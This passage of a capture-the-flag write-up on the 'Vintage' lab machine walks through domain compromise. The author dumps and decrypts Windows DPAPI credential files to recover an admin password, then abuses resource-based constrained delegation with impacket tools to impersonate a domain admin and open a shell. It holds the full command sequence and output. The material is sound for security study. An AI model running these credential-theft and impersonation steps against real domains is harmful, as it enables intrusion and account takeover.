[Convert]::ToBase64String((Get-Content -path "C:\Users\C.Neri\appdata\roaming\microsoft\protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b" -Encoding byte))

[Convert]::ToBase64String((Get-Content -path "C:\Users\C.Neri\appdata\roaming\microsoft\credentials\C4BB96844A5C9DD45D5B6A9859252BA6" -Encoding byte))
```

```terminal
*Evil-WinRM* PS C:\Users\C.Neri\Documents> [Convert]::ToBase64String((Get-Content -path "C:\Users\C.Neri\appdata\roaming\microsoft\credentials\C4BB96844A5C9DD45D5B6A9859252BA6" -Encoding byte))
AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==
```

```terminal
*Evil-WinRM* PS C:\Users\C.Neri\Documents> [Convert]::ToBase64String((Get-Content -path "C:\Users\C.Neri\appdata\roaming\microsoft\protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf
41a3-a552-4cf7-a8d7-aca2d6f7339b" -Encoding byte))                                              AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=
```

There are two masterkey file, for saving time the ones that will work for us is `99cf41a3-a552-4cf7-a8d7-aca2d6f7339b`

After decoding the files and saving them into our machine, we can use `dpapi.py` from `impacket` to extract credentials

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 18:48]-[~/ctf/htb/vintage]
└──╼[★]$ dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -password 'Zer0the0ne' -sid S-1-5-21-4024337825-2033394866-2055507597-1115
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
                                               
[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a

```

We got the key, let's use it to decrypt the credentials file.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 18:48]-[~/ctf/htb/vintage]
└──╼[★]$ dpapi.py credential -f C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

We got the password of use `c.nery_adm`

### c.neri_adm -> domain admin

Let's check this user on bloodhound

![adm](5.png)

The `c.neri_adm` admin is part of `DelegatedAdmins` groups that has the `AllowedToAct` attribute over DC01.

>An attacker can use this account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.
{: .prompt-info }

The only thing here is that we need a user with an SPN or a machine account.

I'll be using the `gmsa01$` here.

The user `c.neri_adm` can add user to the group so let's add `gmsa01$` to the group.

```bash
[★]$ KRB5CCNAME=c.neri_adm.ccache bloodyAD -k --host DC01.vintage.htb -d vintage.htb add groupMember delegatedadmins 'gmsa01$'
[+] gmsa01$ added to delegatedadmins
```

Now let's retrieve the administrator's ticket

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-16 20:17]-[~/ctf/htb/vintage]                                                                                                                        
└──╼[★]$ getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'administrator' 'vintage.htb/gmsa01$' -hashes :5008d30496b4c5069ce1fc187b5b5960
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
                        
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator          
[*] Requesting S4U2self 
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

We got the administrator's ticket, let's export it and get a shell.

```bash
export KRB5CCNAME=administrator@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

```terminal
[★]$ wmiexec.py -k -no-pass vintage.htb/administrator@dc01.vintage.htb                      
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc000015b - STATUS_LOGON_TYPE_NOT_GRANTED - A user has requested a type of logon (for example, interactive or network) that has not been granted. An administrator has control over who may logon interactively and through the network.
```

That didn't work because administrator is marked as a sensitive account, let's try with the use `l.bianchi_adm` since they are part of domain admins group.

```terminal
getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'l.bianchi_adm' 'vintage.htb/gmsa01$' -hashes :5008d30496b4c5069ce1fc187b5b5960 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating l.bianchi_adm
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in l.bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

```bash
export KRB5CCNAME=l.bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

```terminal
[★]$ wmiexec.py -k dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
vintage\l.bianchi_adm
```

We domain admin!

## **References**

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
